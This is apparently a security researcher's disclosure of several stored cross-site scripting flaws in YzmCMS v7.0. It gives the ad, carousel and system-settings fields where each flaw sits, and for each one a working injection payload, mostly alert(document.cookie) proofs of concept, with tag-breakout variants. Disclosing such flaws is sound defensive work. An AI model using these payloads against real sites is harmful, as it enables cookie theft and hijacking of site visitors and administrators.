YZMCMS(v7.0) has multiple vulnerabilities， Cross Site Scripting(XSS)



The YzmCMS v7.0 content management system has multiple storage-optimized XSS vulnerabilities.
The vulnerability detection process is as follows:



Location of the vulnerability: Module Management -> Ads Management

1、Click Edit and select HTML as the ad type.

```
payload1:<img src=x onerror="(‘asen-xss’)">
payload2:<img src=x onerror="alert(document.cookie)">
```

![image-20240307171414528](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307171414528.png)

![image-20240307172042478](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307172042478.png)

Registered members test1, triggered after visiting the homepage.

![image-20240307171729207](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307171729207.png)

![image-20240307172143798](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307172143798.png)



2、In the edit ad, select any ad type, and there is a stored XSS in the concise description.

```
payload:"><img src=x onerror="alert(document.cookie)">
```

![image-20240307172540484](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307172540484.png)

Triggered when this ad is edited.

![image-20240307172652200](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307172652200.png)

![image-20240307172703790](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307172703790.png)



Location of the vulnerability: Module Management - > Carousel Management - > Add Carousel - > Edit

1、Stored XSS instances exist in the title name.

```
payload：test"><img src=x onerror="alert(document.cookie)">
```

![image-20240307173045097](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307173045097.png)

After saving, it is triggered by accessing the carousel management interface.

![image-20240307173140344](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307173140344.png)

Editing the corresponding carousel is also triggered.

![image-20240307173222137](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307173222137-170980394376410-170980394533612.png)



2、XSS is stored at the link address, which cannot be changed after being written, and the malicious code can only be eliminated by deleting the carousel.

(1) XSS is triggered only once.

```
payload：http://test"<img src=x onerror="alert(‘asen-xss2’)">
```

![image-20240307173504611](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307173504611.png)

![image-20240307173521960](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307173521960.png)

At this point, we went to modify the link address again, and found that the change failed anyway.

![image-20240307173557228](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307173557228.png)



(2) XSS is triggered multiple times.

```
payload: test"><img src=x onerror="alert(document.cookie)">
```

If you enter payload twice at the link address, the first XSS will not be triggered, and after the second entry is saved, the carousel management will trigger multiple XSS, and the editing will also trigger multiple XSS.

After the first entry, the result:

![image-20240307173730558](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307173730558.png)

Second Input:

![image-20240307173759891](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307173759891.png)

The result of the second input after saving:

![image-20240307180614783](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307180614783.png)

![image-20240307180630702](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307180630702.png)

![image-20240307180641733](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307180641733.png)



3、The carousel in the edit has xss stored in it.

```
payload: test"<img src=x onerror="alert('asen-xss2')">
```

![image-20240307180803850](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307180803850.png)

![image-20240307180815072](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307180815072.png)



4、Edit - > briefly states that there is a storage XSS

```
payload: test</textarea><img src=x onerror="alert('asen-xss3')"><textarea>
```

![image-20240307180924680](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307180924680.png)

Once submitted, click Edit in this carousel again to trigger it.

![image-20240307180958342](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307180958342.png)



Location of the vulnerability: Background Management - > System Management - > System Settings

1、Basic Settings - > at the statistics code

```
payload:<img src=x onerror="alert(‘asen-xss3’)">
```

![image-20240307181217683](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307181217683.png)

Triggered when you visit the homepage.

![image-20240307181307602](C:\Users\zls52\Desktop\study笔记\new\Yzmcms-xss\image-20240307181307602.png)



Suggestion: The vendor changed the code to filter the input parameters.